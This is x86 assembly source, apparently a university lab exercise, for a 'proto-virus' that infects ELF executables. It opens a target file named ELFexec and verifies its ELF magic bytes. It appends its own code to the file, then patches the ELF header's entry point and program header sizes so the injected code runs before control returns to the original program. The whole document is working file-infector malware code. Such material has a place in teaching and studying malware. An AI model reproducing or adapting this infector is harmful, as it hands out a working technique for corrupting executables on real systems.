%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define STDOUT 1 

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
global _start

section .text

_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES                    		; Set up ebp and reserve space on the stack for local storage
	
	call get_my_loc
	sub ecx, next_i-msg
	write STDOUT, ecx, 16						; print to STDOUT the message: This is a virus

	call get_my_loc
	sub ecx, next_i-FileName
	mov dword [ebp-4], ecx
    open dword [ebp-4], RDWR, 0777      		; open the file ELFexec with the mode RDWR
	cmp eax, -1
	je .fileError                       		; check if file opened succsessfully 

    mov [ebp-4], eax                    		; check ELF file using magic number
    push dword [ebp-4]
    call checkELF
    add esp, 4
    cmp eax, -1
    je .fileError
    
    lseek dword [ebp-4], 0, SEEK_END    		; get the file size
	mov dword [ebp-8], eax              		; put the cursor to the ELFexec at the end of the file

    mov edx, virus_end                  		; save code_end address on ecx
	sub edx, _start                     		; update to the correct code_end address on ecx

	call get_my_loc
	sub ecx, next_i-_start
	mov dword [ebp-80], ecx
	write dword [ebp-4], dword [ebp-80], edx	; write all the code of the virus at the end of the ELF file
	
	;Code to copy the ELF header into memory (on the stack)
	lseek dword [ebp-4], 0, SEEK_SET			; set to point the start of the ELF file	
	mov esi, ebp
	sub esi, 60									; sub 60 to arrive the correct offset, program headers start at offset 52 and there are 2 program headers each is 4 offset (52+4+4)
	read dword [ebp-4], esi, 52
	lseek dword [ebp-4], -4, SEEK_END			; update the file descriptor seek end to the ELFexec file for the future
	add esi, 24									; to arrive the beginning of the entry point we want to modify (18 in hexa, 24 in decimal), this is the offset
	write dword [ebp-4], esi, 4					; write the print of the virus
	sub esi, 24									; back to normal
	lseek dword [ebp-4], 0, SEEK_SET			; update the file descriptor seek set to the beginning of the file
	mov ebx, 0x08049000
	add ebx, dword [ebp-8]
	mov dword [esi+24], ebx

	;Code to modify the copy of the ELF header of ELFexec
	lseek dword [ebp-4], 0, SEEK_SET			; set to point the start of the ELF file
	mov esi, ebp
	sub esi, 60
	write dword [ebp-4], esi, 52
	
	lseek dword [ebp-4], 100, SEEK_SET
	sub esi, 4
	mov dword [esi], 0x00000f85					; file size of second program header
	write dword [ebp-4], esi, 4					; update memory size and file size
	write dword [ebp-4], esi, 4					; update memory size and file size

	close dword [ebp-4]
	mov eax, 0
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
	jmp dword [ecx]
    
	.fileError:
		write STDOUT, errMsg, 14		
		mov eax, -1
	
; You code for this lab goes here

VirusExit:
    add	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
    exit eax                    ; Termination if all is OK and no previous code to jump to
                                ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
;FileName:	db "ELFexec2", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
msg:        db "This is a virus", 10, 0
errMsg:     db "error in file", 10, 0

get_my_loc:
	call next_i

next_i:
	pop ecx
	ret

checkELF:
	push ebp
	mov ebp, esp

	sub esp, 4
	read dword [ebp+8], esp, 4
	mov ecx, ebp
	sub ecx, 3
	cmp byte [ecx], 'E'
	jne .notELF
	inc ecx
	cmp byte [ecx], 'L'
	jne .notELF
	inc ecx
	cmp byte [ecx], 'F'
	jne .notELF
	mov eax, 1

	jmp .endCheckELF

	.notELF:
		mov eax, -1
		jmp .endCheckELF

	.endCheckELF:

	add esp, 4

	mov esp, ebp
	pop ebp

	ret

PreviousEntryPoint: dd VirusExit

virus_end: